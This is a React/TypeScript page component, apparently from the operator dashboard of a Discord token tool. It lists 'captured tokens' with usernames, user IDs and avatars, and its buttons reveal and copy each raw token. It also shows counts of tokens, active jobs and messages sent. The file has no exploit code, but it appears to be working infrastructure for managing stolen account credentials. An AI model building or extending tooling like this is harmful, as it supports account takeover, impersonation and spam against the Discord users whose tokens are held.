import { useState } from "react";
import {
  useListTokens,
  getListTokensQueryKey,
  useGetStats,
  getGetStatsQueryKey,
} from "@workspace/api-client-react";

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { useToast } from "@/hooks/use-toast";
import { KeyRound, Users, Activity, MessageSquare, Copy, Eye, EyeOff } from "lucide-react";
import { format } from "date-fns";

export default function Info() {
  const { toast } = useToast();
  const [revealedTokens, setRevealedTokens] = useState<Record<number, boolean>>({});

  const { data: tokens, isLoading: tokensLoading } = useListTokens({
    query: { queryKey: getListTokensQueryKey() }
  });

  const { data: stats } = useGetStats({
    query: { queryKey: getGetStatsQueryKey() }
  });

  const toggleReveal = (id: number) => {
    setRevealedTokens(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "Copied to clipboard", description: "Token copied successfully." });
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div>
        <h1 className="text-3xl font-display font-bold tracking-tight text-foreground flex items-center gap-3">
          <KeyRound className="w-8 h-8 text-primary" />
          System Information
        </h1>
        <p className="text-muted-foreground mt-1">Platform statistics and captured tokens.</p>
      </div>

      {stats && (
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <Card className="bg-card/50 backdrop-blur-sm border-border">
            <CardContent className="p-6 flex items-center gap-4">
              <div className="p-3 bg-primary/10 text-primary rounded-lg"><Users className="w-5 h-5" /></div>
              <div>
                <p className="text-sm font-medium text-muted-foreground">Authorized Users</p>
                <p className="text-2xl font-bold text-foreground">{stats.totalAuthorizedUsers}</p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-card/50 backdrop-blur-sm border-border">
            <CardContent className="p-6 flex items-center gap-4">
              <div className="p-3 bg-secondary/10 text-secondary rounded-lg"><Activity className="w-5 h-5" /></div>
              <div>
                <p className="text-sm font-medium text-muted-foreground">Active Jobs</p>
                <p className="text-2xl font-bold text-foreground">{stats.activeJobs}</p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-card/50 backdrop-blur-sm border-border">
            <CardContent className="p-6 flex items-center gap-4">
              <div className="p-3 bg-accent/50 text-foreground rounded-lg"><KeyRound className="w-5 h-5" /></div>
              <div>
                <p className="text-sm font-medium text-muted-foreground">Total Tokens</p>
                <p className="text-2xl font-bold text-foreground">{stats.totalTokens}</p>
              </div>
            </CardContent>
          </Card>
          <Card className="bg-card/50 backdrop-blur-sm border-border">
            <CardContent className="p-6 flex items-center gap-4">
              <div className="p-3 bg-chart-3/10 text-chart-3 rounded-lg"><MessageSquare className="w-5 h-5" /></div>
              <div>
                <p className="text-sm font-medium text-muted-foreground">Messages Sent</p>
                <p className="text-2xl font-bold text-foreground">{stats.totalMessagesSent}</p>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <Card>
        <CardHeader>
          <CardTitle>Captured Tokens</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="rounded-md border border-border overflow-hidden">
            <Table>
              <TableHeader className="bg-muted/50">
                <TableRow>
                  <TableHead>User</TableHead>
                  <TableHead>Discord ID</TableHead>
                  <TableHead>Token</TableHead>
                  <TableHead>Added By</TableHead>
                  <TableHead>Added At</TableHead>
                  <TableHead>Last Validated</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {tokensLoading ? (
                  <TableRow>
                    <TableCell colSpan={6} className="h-24 text-center">Loading tokens...</TableCell>
                  </TableRow>
                ) : tokens?.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="h-24 text-center text-muted-foreground">
                      No tokens stored yet.
                    </TableCell>
                  </TableRow>
                ) : (
                  tokens?.map((t) => (
                    <TableRow key={t.id} className="hover:bg-muted/50 transition-colors">
                      <TableCell>
                        <div className="flex items-center gap-3">
                          {t.discordAvatar ? (
                            <img src={t.discordAvatar} alt="" className="w-8 h-8 rounded-full border border-border" />
                          ) : (
                            <div className="w-8 h-8 rounded-full bg-primary/10 flex items-center justify-center font-bold text-xs text-primary">
                              {t.discordUsername[0]?.toUpperCase()}
                            </div>
                          )}
                          <span className="font-medium text-foreground">{t.discordUsername}</span>
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-xs text-muted-foreground">{t.discordUserId}</TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <code className="bg-muted px-2 py-1 rounded text-xs text-primary max-w-[150px] truncate block">
                            {revealedTokens[t.id] ? t.token : "••••••••••••••••••••••••••••••••••••••••••••"}
                          </code>
                          <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleReveal(t.id)}>
                            {revealedTokens[t.id] ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                          </Button>
                          <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(t.token)}>
                            <Copy className="w-3 h-3" />
                          </Button>
                        </div>
                      </TableCell>
                      <TableCell className="text-sm text-muted-foreground">{t.addedByUsername}</TableCell>
                      <TableCell className="text-sm text-muted-foreground">
                        {format(new Date(t.addedAt), "MMM d, yyyy")}
                      </TableCell>
                      <TableCell className="text-sm text-muted-foreground">
                        {t.lastValidated ? format(new Date(t.lastValidated), "MMM d, yyyy") : "Never"}
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
